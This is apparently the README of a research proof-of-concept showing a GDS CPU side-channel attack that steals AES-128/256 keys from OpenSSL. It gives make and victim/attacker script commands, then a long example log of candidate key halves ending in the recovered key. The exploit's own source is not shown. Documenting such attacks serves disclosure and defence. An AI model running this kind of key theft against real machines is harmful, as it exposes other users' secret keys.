# Stealing OpenSSL AES keys with GDS

This is a proof-of-concept attack that steal AES keys from OpenSSL. 

## Usage
`make clean && make`

`./openssl_encrypt_128.sh` or `./openssl_encrypt_256.sh` as victim

`./attack_encrypt_128bit.sh` or `./attack_encrypt_256bit.sh` as attacker


## Example output
Victim:
```
victim@laptop:~/PATH/POC/gds_aes_ni$ ./openssl_encrypt_128.sh 
Key: DBF1EF67AB81F9AE:C4074949791B5202
```

Attacker:
```
danielmm@laptop:~/PATH/POC/gds_aes_ni$ ./attack_encrypt_128bit.sh 
1f0a40909c52e9d6
272b802af95be155
29dc1b67b58ef2b1
2a46dbe7d31d3ab2
2e3fd20e9bb120bf
580846b50a5ae307
75f198d1de70617f
dbf1ef67ab81f9ae
f03d49746b8c69cb
1st QWORD Candidates: 9
1a772836636c7a34
3031f3d1b0714086
32804e318f4824d9
590c27fabdc86ae8
62635663d21216e5
6839b564ba2ba381
7733f5f426794a57
c2bd0745e4c44d12
c4074949791b5202
e32cc9638040b357
eb611c22514abfa3
2nd QWORD Candidates: 11
Total candidates: 9 x 11 = 99
1 1f0a40909c52e9d61a772836636c7a34
2 1f0a40909c52e9d63031f3d1b0714086
3 1f0a40909c52e9d632804e318f4824d9
4 1f0a40909c52e9d6590c27fabdc86ae8
5 1f0a40909c52e9d662635663d21216e5
6 1f0a40909c52e9d66839b564ba2ba381
7 1f0a40909c52e9d67733f5f426794a57
8 1f0a40909c52e9d6c2bd0745e4c44d12
9 1f0a40909c52e9d6c4074949791b5202
10 1f0a40909c52e9d6e32cc9638040b357
11 1f0a40909c52e9d6eb611c22514abfa3
12 272b802af95be1551a772836636c7a34
13 272b802af95be1553031f3d1b0714086
14 272b802af95be15532804e318f4824d9
15 272b802af95be155590c27fabdc86ae8
16 272b802af95be15562635663d21216e5
17 272b802af95be1556839b564ba2ba381
18 272b802af95be1557733f5f426794a57
19 272b802af95be155c2bd0745e4c44d12
20 272b802af95be155c4074949791b5202
21 272b802af95be155e32cc9638040b357
22 272b802af95be155eb611c22514abfa3
23 29dc1b67b58ef2b11a772836636c7a34
24 29dc1b67b58ef2b13031f3d1b0714086
25 29dc1b67b58ef2b132804e318f4824d9
26 29dc1b67b58ef2b1590c27fabdc86ae8
27 29dc1b67b58ef2b162635663d21216e5
28 29dc1b67b58ef2b16839b564ba2ba381
29 29dc1b67b58ef2b17733f5f426794a57
30 29dc1b67b58ef2b1c2bd0745e4c44d12
31 29dc1b67b58ef2b1c4074949791b5202
32 29dc1b67b58ef2b1e32cc9638040b357
33 29dc1b67b58ef2b1eb611c22514abfa3
34 2a46dbe7d31d3ab21a772836636c7a34
35 2a46dbe7d31d3ab23031f3d1b0714086
36 2a46dbe7d31d3ab232804e318f4824d9
37 2a46dbe7d31d3ab2590c27fabdc86ae8
38 2a46dbe7d31d3ab262635663d21216e5
39 2a46dbe7d31d3ab26839b564ba2ba381
40 2a46dbe7d31d3ab27733f5f426794a57
41 2a46dbe7d31d3ab2c2bd0745e4c44d12
42 2a46dbe7d31d3ab2c4074949791b5202
43 2a46dbe7d31d3ab2e32cc9638040b357
44 2a46dbe7d31d3ab2eb611c22514abfa3
45 2e3fd20e9bb120bf1a772836636c7a34
46 2e3fd20e9bb120bf3031f3d1b0714086
47 2e3fd20e9bb120bf32804e318f4824d9
48 2e3fd20e9bb120bf590c27fabdc86ae8
49 2e3fd20e9bb120bf62635663d21216e5
50 2e3fd20e9bb120bf6839b564ba2ba381
51 2e3fd20e9bb120bf7733f5f426794a57
52 2e3fd20e9bb120bfc2bd0745e4c44d12
53 2e3fd20e9bb120bfc4074949791b5202
54 2e3fd20e9bb120bfe32cc9638040b357
55 2e3fd20e9bb120bfeb611c22514abfa3
56 580846b50a5ae3071a772836636c7a34
57 580846b50a5ae3073031f3d1b0714086
58 580846b50a5ae30732804e318f4824d9
59 580846b50a5ae307590c27fabdc86ae8
60 580846b50a5ae30762635663d21216e5
61 580846b50a5ae3076839b564ba2ba381
62 580846b50a5ae3077733f5f426794a57
63 580846b50a5ae307c2bd0745e4c44d12
64 580846b50a5ae307c4074949791b5202
65 580846b50a5ae307e32cc9638040b357
66 580846b50a5ae307eb611c22514abfa3
67 75f198d1de70617f1a772836636c7a34
68 75f198d1de70617f3031f3d1b0714086
69 75f198d1de70617f32804e318f4824d9
70 75f198d1de70617f590c27fabdc86ae8
71 75f198d1de70617f62635663d21216e5
72 75f198d1de70617f6839b564ba2ba381
73 75f198d1de70617f7733f5f426794a57
74 75f198d1de70617fc2bd0745e4c44d12
75 75f198d1de70617fc4074949791b5202
76 75f198d1de70617fe32cc9638040b357
77 75f198d1de70617feb611c22514abfa3
78 dbf1ef67ab81f9ae1a772836636c7a34
79 dbf1ef67ab81f9ae3031f3d1b0714086
80 dbf1ef67ab81f9ae32804e318f4824d9
81 dbf1ef67ab81f9ae590c27fabdc86ae8
82 dbf1ef67ab81f9ae62635663d21216e5
83 dbf1ef67ab81f9ae6839b564ba2ba381
84 dbf1ef67ab81f9ae7733f5f426794a57
85 dbf1ef67ab81f9aec2bd0745e4c44d12
86 dbf1ef67ab81f9aec4074949791b5202
Stolen: DBF1EF67AB81F9AEC4074949791B5202
```